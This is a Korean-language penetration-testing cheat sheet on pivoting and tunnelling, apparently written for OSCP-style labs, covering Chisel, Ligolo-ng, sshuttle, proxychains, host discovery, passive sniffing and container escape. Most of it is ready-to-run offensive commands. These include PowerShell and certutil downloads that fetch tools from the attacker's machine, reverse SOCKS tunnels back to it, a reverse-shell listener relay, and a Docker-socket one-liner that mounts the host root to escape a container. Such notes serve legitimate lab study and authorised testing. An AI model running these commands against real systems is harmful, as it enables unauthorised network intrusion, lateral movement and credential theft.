# 피버팅 & 터널링

내부망 첫 발판 머신을 장악한 뒤 그 머신을 통해 더 깊은 네트워크에 접근하는 방법이다. 칼리에서 직접 접근할 수 없는 내부 서브넷을 대상으로 공격할 때 필수적이다.

---

## 피벗팅(Pivoting) vs 횡이동(Lateral Movement)

이 둘은 실무에서 종종 섞어 쓰이지만, 정확히는 다른 층위의 문제다.

- 피벗팅 = 네트워크 도달성(라우팅) 문제. 발판 머신을 경유해서, 칼리가 원래 도달 못 하던 대역에 패킷을 보낼 수 있게 만드는 것. SSH 터널/sshuttle/Chisel/Ligolo-ng 전부 이 문제를 푸는 도구다. 한 번 뚫으면 그 대역 전체(/23, /24 등)에 도달 가능해진다.
- 횡이동 = 인증/취약점 문제. 같은 대역 안에 있는 개별 호스트 하나하나를 실제로 침해하는 것. 크리덴셜 재사용, 서비스 취약점 익스플로잇, Pass-the-Hash 등이 여기 해당한다. 피벗팅이 됐다고 그 대역 안의 모든 호스트가 자동으로 뚫리는 게 아니다 — 호스트마다 별도로 인증/익스플로잇 경로를 찾아야 한다.

흔한 착각: "피벗팅했으니 내부망 호스트들이 다 보인다"와 "그 호스트들을 실제로 장악했다"를 혼동하는 것. 전자는 네트워크 계층, 후자는 애플리케이션/인증 계층 이야기다. 같은 서브넷(예: 172.16.8.0/23) 안에 발판 머신과 새로 공략할 타겟이 같이 있는 게 정상이며, 서브넷이 같다고 이상한 게 아니다.

## 같은 IP = 같은 컴퓨터, 그리고 sshuttle(outbound) vs 리버스쉘 리스너(inbound)는 방향이 반대

한 IP에서 여러 서비스(웹앱, DB, SMB 등)가 동시에 응답하면 그 서비스들은 전부 같은 물리적/논리적 컴퓨터 위에서 돌고 있는 것이다. 웹앱 관리자 패널의 파일 업로드 기능으로 넣은 파일은, 그 웹앱이 실행되고 있는 바로 그 컴퓨터의 디스크에 저장된다 — 즉 그 컴퓨터에서 얻은 쉬이 접근하는 파일시스템과 같은 공간이다.

sshuttle/SSH 터널은 **칼리 → 내부망**으로 나가는 트래픽만 뜻어준다. 리버스쉘(적이 먼저 연결해오는 셔드)는 **내부망 → 칼리** 방향이라, sshuttle이 뜻어줌 없이 대상이 우리(칼리)로 직접 연결할 수 있어야 한다. 대상이 내부망에만 갇훈 경우 칼리로 나가는 경로 자체가 없으므로, 리스너를 **발판 머신**(대상이 실제로 도달 가능한 유일한 지점)에 여려야 한다. 첩단하려면 발판 머신에서 다시 리스너를 켜야 한다.

## 상황 파악

```bash
# 발판 머신에서 내부 인터페이스 확인
ip a
ifconfig
ip route
route

# 내부망 연결 확인
arp -a
cat /etc/hosts

# 내부망 호스트 스캔 (발판 머신에서)
for i in $(seq 1 254); do
  (ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i") &
done; wait  # ← IP 대역 수정
```

### 사설 IP 대역 판별 (RFC 1918)

```jsx
10.0.0.0/8        10.0.0.0   ~ 10.255.255.255
172.16.0.0/12     172.16.0.0 ~ 172.31.255.255   ← 172.x 전체가 아니라 두번째 옥텟이 16~31일 때만 사설
192.168.0.0/16    192.168.0.0 ~ 192.168.255.255
```

이 세 대역 밖의 IP(예: 172.32.x.x, 172.15.x.x)는 사설이 아니라 공인 IP다.

인터페이스가 "이미 아는 망"인지 "새로 발견한 내부망"인지 구분하는 기준은 이름 순서(eth0, eth1...)가 아니라, 그 IP를 내가 이미 접속에 썼는지 여부다. `ip a`에 나온 IP 중 처음 SSH로 접속할 때 쓴 IP와 같은 인터페이스는 이미 아는 망, 나머지 낯선 사설 IP가 새로 뚫어야 할 내부망 후보다. `docker0`/`br-*`/`veth*`처럼 이름 자체가 컨테이너 네트워크임을 알려주는 경우도 있다 (아래 "RCE 확보 직후" 섹션 참고).

### Host Discovery 방법 모음

라우팅 테이블(`ip route`)에 `/16`처럼 넓은 대역이 잡혀 있어도, 실제로 호스트가 존재하는 범위는 훨씬 좁은 경우가 대부분이다. 무작정 `/16` 전체를 스캔하기보다, 이미 아는 IP와 같은 `/24`(256개)부터 시작해서 결과를 보고 필요하면 넓혀가는 게 효율적이다.

```bash
# 방법 1 — nmap -sn (있으면 제일 편함)
nmap -sn 192.168.1.0/24              # 한 서브넷, 빠름
nmap -sn -T2 192.168.0.0/16          # 전체 대역, 속도 낮춰서 안전하게

# 방법 2 — fping (설치돼 있으면 nmap보다 가벼움)
fping -a -g 192.168.1.0/24 2>/dev/null
fping -a -g 192.168.0.0/16 -r 1 -t 500 2>/dev/null   # 재시도/타임아웃 조정으로 부하 최소화

# 방법 3 — bash ping 루프 (nmap/fping 둘 다 없을 때)
# 한 서브넷, 빠르게
for i in $(seq 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo 192.168.1.$i & done

# 전체 /16, 병렬 개수 제한해서 안전하게 (xargs -P)
for a in $(seq 0 255); do for b in $(seq 1 254); do echo "192.168.$a.$b"; done; done | \
xargs -P 50 -I{} sh -c 'ping -c1 -W1 {} &>/dev/null && echo {}'
```

`xargs -P`로 병렬 개수를 제한하지 않고 `/16` 전체를 순수 bash `&`로 한 번에 fork하면, 발판 머신 자체에 부하가 걸리거나 관리자가 로그에서 이상 트래픽을 발견할 위험이 있다.

### 호스트명 명명규칙으로 정찰 우선순위 판단하기

회사들은 서버 이름을 보통 역할 + 지역/환경 코드 + 번호 조합으로 짓는다. 예: pr<location>dc1, dv<location>ad2, usdc02, prodfrdc3. 흔한 접두어/키워드:

```
DC, AD          -> 도메인 컨트롤러 (최종 목표, 보통 방어 제일 강함)
PR, PROD        -> 운영 서버 (방어 강함, 건드리면 위험)
DEV, DV, TEST   -> 개발/테스트 서버 (보안 허술한 경우가 많음, 우선 공략 대상)
WEB             -> 웹서버
SQL, DB         -> 데이터베이스 서버 (크리덴셜/데이터 노다지 가능성)
FILE, FS        -> 파일 서버 (NFS/SMB 공유 확인 대상)
```

호스트 발견 직후(nmap -sn 결과 등), 역방향 DNS나 SMB/NetBIOS 이름 조회로 호스트명을 확인해서 이 패턴에 대입해보면, 어디부터 파야할지 우선순위를 빠르게 정할 수 있다. 예: ACADEMY-AEN-DEV01이라는 이름 하나만 보고도 개발 서버라 보안이 허술할 가능성이 높다는 가설을 세우고 먼저 공략 대상으로 삼을 수 있다.

```bash
# 호스트명 확인 (SMB/NetBIOS)
nxc smb <IP대역>/24 2>/dev/null
nmblookup -A <IP>
smbclient -L <IP> -N

# 역방향 DNS
for ip in $(cat live_hosts.txt); do host $ip; done
```

## SSH ProxyJump (멀티홉)

SSH 접근 권한이 있을 때 가장 깔끔한 방법이다. 중간 머신을 자동으로 경유해 최종 목적지에 바로 연결한다.

```bash
# 단일 홉 — Jump 머신을 경유해 Target에 접속
# -J <jump>: 점프 호스트 지정
ssh -J <발판IP> <내부IP>  # ← 수정

# 사용자명 지정
ssh -J user1@<발판IP> user2@<내부IP>

# 멀티 홉 (2단계 이상)
ssh -J <발판1IP>,<발판2IP> <최종내부IP>

# ProxyJump로 포트 포워딩
ssh -J <발판IP> -L 8080:localhost:80 <내부IP>
ssh -J <발판IP> -D 1080 <내부IP>    # SOCKS 프록시

# ~/.ssh/config 에 등록 (매번 입력 불필요)
# Host pivot
#   HostName <발판IP>
#   User user1
# Host internal
#   HostName <내부IP>
#   User user2
#   ProxyJump pivot
# 이후: ssh internal 만 입력해도 자동 경유
```

## Chisel — HTTP/SOCKS 터널

SSH가 막혀있거나 자격증명이 없을 때 사용한다. HTTP 프로토콜로 방화벽을 우회하고 SOCKS5 프록시를 통해 proxychains으로 내부망에 접근한다.

```bash
# 설치 (칼리)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gzip -d chisel_linux_amd64.gz
mv chisel_linux_amd64 chisel
chmod +x chisel

# 사용할 때 버전 일치 필수 (클라이언트 = 서버)
```

### 기본 SOCKS5 Reverse Tunnel (가장 많이 사용)

```bash
# 1단계: 칼리 (서버 역할)
./chisel server -p 8080 --reverse

# 2단계: 발판 머신 (클라이언트 — HTTP 서버에서 다운로드)
./chisel client <칼리IP>:8080 R:socks  # ← 수정
# → 칼리 1080 포트에 SOCKS5 리스너 생성됨

# 3단계: /etc/proxychains4.conf 확인
tail -1 /etc/proxychains4.conf
# socks5 127.0.0.1 1080 이어야 함

# 4단계: proxychains으로 내부망 접근
proxychains nmap -sT -Pn -p 22,80,443,445 <내부IP>  # ← 수정
proxychains nxc smb <내부IP> -u user -p pass
proxychains evil-winrm -i <내부IP> -u user -p pass
proxychains ssh user@<내부IP>
```

### 포트 포워딩 (특정 포트만)

```bash
# 발판 머신의 특정 포트를 칼리 로컬로 포워딩
# 칼리 서버
./chisel server -p 8080 --reverse

# 발판 머신 — 내부 3306을 칼리 로컬 13306으로 포워딩
./chisel client <칼리IP>:8080 R:13306:127.0.0.1:3306  # ← 수정
# 이후 칼리에서: mysql -h 127.0.0.1 -P 13306 -u root

# 발판 머신 내부망의 다른 머신 포트 포워딩
./chisel client <칼리IP>:8080 R:18080:<내부IP>:80   # ← 수정
# 이후 칼리에서: curl http://127.0.0.1:18080
```

### Windows 대상 (PowerShell 다운로드)

```powershell
# Windows용 chisel 다운로드
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<칼리IP>/chisel.exe','C:\Temp\chisel.exe')"

# SOCKS reverse
C:\Temp\chisel.exe client <칼리IP>:8080 R:socks
```

## Ligolo-ng — TUN 인터페이스 기반 (OSCP 권장)

proxychains 없이 일반 명령어를 그대로 사용할 수 있어 실전에서 가장 편하다. TUN 인터페이스를 만들어 내부망을 직접 라우팅한다.

```bash
# 설치 (칼리)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64.tar.gz
tar -xzf proxy_linux_amd64.tar.gz
mv proxy /opt/ligolo-proxy
chmod +x /opt/ligolo-proxy

# 에이전트 (발판 머신용 — 발판 머신 OS에 맞게 다운로드)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64.tar.gz
# Windows용: agent_windows_amd64.zip
```

### Linux 피버팅

```bash
# 1단계: 칼리 — TUN 인터페이스 생성
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2단계: 칼리 — proxy 서버 실행
./proxy -selfcert -laddr 0.0.0.0:11601

# 3단계: 발판 머신 — agent 실행
./agent -connect <칼리IP>:11601 -ignore-cert  # ← 수정

# 4단계: 칼리 proxy 콘솔에서
ligolo-ng » session
# 에이전트 선택
[Agent : user@pivot] » ifconfig    # 내부 서브넷 확인
[Agent : user@pivot] » start       # 터널 시작

# 5단계: 칼리 — 내부 서브넷 라우트 추가
sudo ip route add 192.168.2.0/24 dev ligolo  # ← 내부 서브넷으로 수정

# 6단계: 이제 proxychains 없이 직접 접근
nmap -sV 192.168.2.10              # ← 수정
nxc smb 192.168.2.0/24
evil-winrm -i 192.168.2.10 -u user -p pass
```

### Windows 에이전트

```powershell
# Windows 발판 머신에서
certutil -urlcache -split -f http://<칼리IP>/agent.exe C:\Temp\agent.exe
C:\Temp\agent.exe -connect <칼리IP>:11601 -ignore-cert
```

### Ligolo-ng 포트 포워딩 (리스너)

```bash
# 내부망 머신에서 칼리로 리버스 커넥션 받기
# (내부 머신이 직접 칼리에 연결 못할 때)

# proxy 콘솔에서
[Agent : user@pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# → 발판 머신의 4444로 오는 연결을 칼리 4444로 포워딩

# 내부 머신에서 리버스 쉘 실행 → 발판 머신 4444로 연결하면 칼리로 도착
```

## proxychains 설정

```bash
# /etc/proxychains4.conf 확인
sudo vim /etc/proxychains4.conf

# 마지막 줄에 아래 중 하나:
socks5 127.0.0.1 1080    # chisel SOCKS5
socks4 127.0.0.1 1080    # dynamic SSH 포워딩

# strict_chain → dynamic_chain으로 변경 (여러 홉 시)
# strict_chain   → 주석 처리
# dynamic_chain  → 주석 해제

# proxychains 사용 예시
proxychains nmap -sT -Pn 192.168.2.0/24    # ICMP 안 되므로 -Pn 필수
proxychains curl http://192.168.2.10/
proxychains ssh user@192.168.2.10
proxychains impacket-psexec admin:'Pass'@192.168.2.10
```

### SSH Dynamic Port Forwarding (단일 홉, 기본형)

ProxyJump 없이 그냥 SSH 자격증명 하나로 SOCKS 프록시를 여는 가장 기본적인 형태다.

```bash
ssh -D <로컬포트> -i <키파일> user@<발판IP>   # ← 수정
# 예: ssh -D 8081 -i pivot_key root@10.129.x.x
# 이 터미널은 프록시로 계속 떠 있어야 하니 그대로 켜둔다

# proxychains 설정 (/etc/proxychains4.conf 마지막 줄)
socks4 127.0.0.1 <로컬포트>
```

### nmap + proxychains 조합의 구조적 한계

`proxychains`는 프로그램의 소켓 호출을 가로채서 강제로 blocking 모드로 바꾸는데, nmap의 스캔 엔진은 애초에 여러 연결을 non-blocking으로 동시에 쏘고 select()/poll()로 관리하도록 설계되어 있다. 이 둘이 근본적으로 안 맞아서, -n, --max-parallelism 1, timeout 조정 등 뭘 해도 대부분 포트가 filtered로 잘못 나온다. nmap 자체 내장 --proxies socks4://... 옵션도 동일한 문제를 겪는다. SYN 스캔(-sS)은 애초에 raw socket이 필요해서 어떤 프록시로도 안 됨 — -sT(connect scan)만 가능하다.

```bash
# 이렇게 하면 대부분 filtered로 오판됨 (신뢰 불가)
proxychains nmap -sT -Pn -n 172.16.5.35
```

대안 1 — sshuttle (proxychains 접두어 없이 일반 도구를 그대로 씀)

```bash
sudo sshuttle -r user@<발판IP> --ssh-cmd "ssh -i <키파일>" <내부대역>/24 -x <발판IP>   # ← 수정
# -x <발판IP> : 발판 자신의 IP는 라우팅에서 제외 (자기 자신 스캔 시 이상 동작 방지)

# 이후 proxychains 없이 그냥 사용
nmap -sT -Pn -n <내부IP>
curl http://<내부IP>/
```

주의: sshuttle도 완벽하지 않다. iptables REDIRECT 규칙으로 모든 아웃바운드 TCP를 로컬 리스너가 먼저 받아버리기 때문에, 대상이 실제로 응답 안 해도 모든 포트가 open으로 잘못 나올 수 있다. 스캔 결과가 의심스러우면 발판 머신에서 직접 nmap을 돌려서 교차검증할 것.

대안 2 — 발판 머신에서 직접 nmap 실행 (제일 확실함)

proxychains/sshuttle 둘 다 우회 계층을 거치는 한 근본적으로 완벽할 수 없다. 발판 머신 자체에 static nmap을 올려서 그 머신이 직접 내부망을 스캔하게 하는 게 가장 정확하다 (아래 "발판 머신에 도구 올리기" 참고). 다만 root shell이 이미 있어야 하고, 파일 업로드 흔적이 남는다는 트레이드오프가 있다.

결론: SYN 스캔이나 완전한 정확도가 필요하면 ligolo-ng가 유일한 선택지다 (tun 인터페이스로 진짜 IP 패킷을 라우팅하기 때문에 SOCKS 계층 자체가 없음, 위 섹션 참고).

## 발판 머신에 도구 올리기 (static binary)

발판 머신에 nmap 등이 없거나 구버전이면 정적 컴파일된(static) 바이너리를 올려서 사용해야 한다. 칼리의 /usr/bin/nmap을 그대로 올리면 대부분 실패한다 — 최신 라이브러리([libssl.so](http://libssl.so).3 등)에 의존하는 dynamic binary라서, 오래된 대상 OS에는 그 버전의 라이브러리가 없기 때문이다.

```bash
# 1단계 — 올리려는 바이너리가 dynamic인지 static인지 확인
file /usr/bin/nmap        # 대부분 쉘 스크립트 래퍼, 진짜 바이너리는 아래
file /usr/lib/nmap/nmap
ldd /usr/lib/nmap/nmap    # 라이브러리 목록이 쭉 뜨면 dynamic → 그대로 올리면 위험

# 2단계 — static binary 저장소에서 받기
git clone --depth 1 https://github.com/andrew-d/static-binaries.git
file static-binaries/binaries/linux/x86_64/nmap
# "statically linked"면 성공, 바로 사용 가능

# 3단계 — 로컬에서 실행 확인 후 SCP로 발판에 업로드
./static-binaries/binaries/linux/x86_64/nmap --version
scp -i <키파일> static-binaries/binaries/linux/x86_64/nmap user@<발판IP>:/tmp/nmap   # ← 수정

# 발판에서
chmod +x /tmp/nmap
/tmp/nmap --version
```

### GitHub 다운로드가 막힐 때 (429 Too Many Requests)

2025년부터 GitHub가 [raw.githubusercontent.com](http://raw.githubusercontent.com)에 대해 미인증 요청 전용 rate limit을 별도로 걸어서, wget/curl로 개별 파일(raw, blob URL)을 받으면 429 에러나 HTML 에러 페이지가 대신 저장되는 경우가 흔하다.

```bash
# 실패 패턴 — 429 또는 HTML이 저장됨
curl -L https://raw.githubusercontent.com/user/repo/master/file -o file
file file   # "HTML document" 면 실패한 것

# 해결 1 — git clone은 다른 엔드포인트(smart HTTP)를 써서 이 제한을 덜 탐
git clone --depth 1 https://github.com/user/repo.git

# 해결 2 — jsDelivr CDN 미러 경유
curl -L https://cdn.jsdelivr.net/gh/user/repo@master/path/to/file -o file
```

## 피벗 지점에서 패시브 스니핑 (tcpdump)

루트 권한으로 내부망에 발을 걸친 호스트를 확보하면, 그 인터페이스를 지나가는 트래픽을 도청해서 평문 크리덴셜을 건질 수 있다. 능동적으로 뭔가 조작하는 게 아니라 그냥 지나가는 걸 듣기만 하는 패시브 스니핑이다 (ARP spoofing처럼 트래픽을 나한테 끌어오는 액티브 스니핑과 구분됨 — 액티브는 탐지 위험이 더 큼).

```bash
# 내부망 인터페이스에서 캡처 (시간 제한 걸어서 무한정 안 돌게)
timeout 60 tcpdump -i <내부인터페이스> -s 65535 -w /tmp/capture.pcap

# 로컬로 다운로드 후 분석
scp -i <키파일> user@<발판IP>:/tmp/capture.pcap .   # ← 수정
tcpdump -r capture.pcap -nn      # 빠르게 텍스트로 훑어보기
wireshark capture.pcap           # GUI로 상세 분석
```

언제 유용한가: 사람이 실제로 로그인/파일공유 접속하는 사용자 VLAN에 위치한 경우 — 평문 프로토콜(FTP, HTTP Basic Auth, SMB NTLM 등) 크리덴셜을 잡을 가능성이 있다.

언제 무의미한가: 지금처럼 사람이 없는 서버-서버 구간(DMZ, 백엔드 전용망)에 있으면, IGMP/ICMP6 multicast query, ARP request 같은 순수 프로토콜 관리 트래픽만 잡히고 끝나는 경우가 대부분이다. 이것도 "빈손"이라는 것 자체를 확인하는 것이 정찰의 일부다.

## RCE 확보 직후: 이 발판이 진짜 호스트인지 컨테이너인지 판별하기

초기 발판(웹쉘, RCE)을 얻으면 바로 피벗을 시도하기 전에, 이 호스트가 컨테이너인지 실제 호스트인지부터 확인해야 한다. 컨테이너면 대부분 격리돼 있어 피벗 가치가 낮고, 실제 호스트(특히 Docker를 직접 운영하는 호스트)면 다른 여러 서비스로 가는 관문일 수 있다.

### 1순위 판별법 — 네트워크 인터페이스 이름으로 확정 (IP 대역 추측보다 신뢰도 높음)

```bash
ifconfig
ip a
```

```
docker0        # 있으면 이 서버는 Docker를 직접 실행하는 호스트다. 컨테이너 안에서는 이 인터페이스가 절대 안 보임
br-*           # Docker가 커스텀 네트워크를 만들 때 생기는 브릿지, 이것도 호스트에만 있음
veth*          # 호스트와 각 컨테이너를 1:1로 잇는 가상 케이블, 여러 개 있으면 이 호스트가 여러 컨테이너를 담고 있다는 뜻
```

이 세 종류 중 하나라도 있으면 확정적으로 호스트다. 컨테이너 안에서 `ifconfig`를 치면 보통 `eth0` 하나만 단순하게 보인다.

### 2순위 판별법 — 컨테이너 안에서 직접 확인 (역방향 검증)

```bash
cat /proc/1/cgroup
# 경로가 /docker/... 로 시작하면 현재 프로세스가 Docker cgroup 안에서 돌고 있다는 확정적 증거

ls -la /.dockerenv
# Docker가 컨테이너 시작 시 자동으로 만드는 마커 파일, 있으면 100% 컨테이너
```

이 두 파일은 호스트에서는 존재 자체가 없거나 다른 내용이 나온다. 다만 슬래시(`/`)가 필터링되는 Command Injection 환경에서는 이 경로 자체에 접근이 안 될 수 있다 — 이럴 때는 1순위 방법(인터페이스 이름)이 더 실용적이다.

### 3순위 참고 — IP 대역 (보조 지표일 뿐, 단독 근거로 쓰지 말 것)

| IP 대역 | 의미 | 주의 |
| --- | --- | --- |
| 172.17.0.0/16 | Docker 기본 브릿지 네트워크 | 컨테이너일 가능성 있음, 확정 아님 |
| 172.18.0.0/16 ~ 172.31.0.0/16 | Docker 커스텀 브릿지 네트워크 | 컨테이너일 가능성 있음, 확정 아님 |
| 192.168.122.0/24 | libvirt/KVM 기본 가상화 대역 | 가상화 관리망일 가능성 |

실제 회사 내부망도 172.x 대역을 그대로 쓸 수 있다. IP 대역만 보고 "이건 Docker다"라고 단정하면 틀릴 수 있으니, 반드시 1순위(인터페이스 이름) 또는 2순위(cgroup/.dockerenv)로 확정하고, 그래도 애매하면 스코프 문서에 명시된 내부망 대역과 대조한다.

### 판단 이후 액션

- `docker0`/`br-*` 인터페이스가 있는 호스트로 확인되면: 이 호스트가 다른 여러 컨테이너(다른 vhost들)를 동시에 운영하고 있을 가능성이 높다 — 피벗/횡이동 가치가 높은 지점
- 인터페이스가 실제 내부망(스코프 대역)에도 연결돼 있으면: 피벗팅 도구(ligolo-ng, chisel 등) 설정해서 내부망 스캔으로 이어감
- 격리된 컨테이너로 확정되면: 이 발판은 "RCE 확보"라는 finding으로만 기록하고, 컨테이너 탈출 가능성만 가볍게 확인 후 다음 타겟으로 넘어감
- 애매하면 `ip route`, `arp -a`로 그 호스트가 다른 어떤 대역과도 통신하는지 추가 확인

## 컨테이너로 확정된 후: 탈출(escape) 시도

`docker0`/`br-*`/`veth*`가 없어서 "컨테이너 확정"으로 끝내지 말고, 시간이 있으면 탈출 가능성도 확인한다. 컨테이너는 네임스페이스/cgroup으로 격리돼 있지만 커널은 호스트와 공유하기 때문에 설정 실수가 있으면 바로 호스트로 나갈 수 있다.

### 1단계: 권한(capability) 확인

```bash
capsh --print | grep cap_sys_admin
cat /proc/self/status | grep Cap
```

`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE` 같은 위험한 capability가 남아있으면 탈출 가능성이 높다.

### 2단계: Docker 소켓이 마운트돼 있는지 확인 (제일 흔하고 확실한 탈출 경로)

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
ls -la /var/run/docker.sock
```

소켓이 있으면, 그 소켓으로 새 컨테이너를 만들면서 호스트 루트 전체를 마운트해 즉시 호스트 셸을 얻을 수 있다.

```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash
```

### 3단계: 특권(privileged) 컨테이너인지 확인 + nsenter로 호스트 네임스페이스 진입

```bash
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
# 호스트 PID 네임스페이스가 공유돼 있으면 더 간단히
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```

### 4단계: 자동화 도구

```bash
# deepce — 마운트된 소켓, 취약한 CVE, capability 기반 우회를 자동 탐지/시도
# https://github.com/stealthcopter/deepce

# CDK — 컨테이너 침투 종합 툴킷 (엔진 취약점, 네트워크 스캔, 권한상승 자동화)
# https://github.com/cdk-team/CDK
```

### 종합 확인 스크립트

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
ps aux | grep -E "(docker|containerd|runc)"
env | grep -i container
mount | grep -E "(proc|sys|dev)"
df -h
```

## RDP 드라이브 리다이렉션 — 파일 전송 우회 (WinRM이 거부될 때)

WinRM/evil-winrm이 권한 문제로 거부될 때(RDP만 허용된 계정인 경우), RDP 자체의 드라이브 공유 기능으로 파일을 주고받을 수 있다.

```bash
# +clipboard: 클립보드 공유 / /drive:<이름>,<로컬경로>: 드라이브 리다이렉션
xfreerdp /v:<IP> /u:<user> /p:'<pass>' /cert:ignore +clipboard /drive:kali,/home/<user>  # ← 수정
```

```powershell
# 윈도우 RDP 세션 안에서 리다이렉된 드라이브 확인
net use
# \\tsclient\<이름> 가 보이면 성공

# 칼리 → 윈도우로 파일 가져오기
copy \\tsclient\kali\tool.exe C:\Windows\Temp\tool.exe
```

칼리 윈도우가 아니라 **RDP 세션 안의 윈도우 터미널**에서 명령을 치고 있는지 프롬프트로 항상 확인할 것 (`PS C:\...>` vs `┌──(...)-[~]`) — 두 터미널이 거의 비슷해 보여서 액션을 연결하기 쉽다.
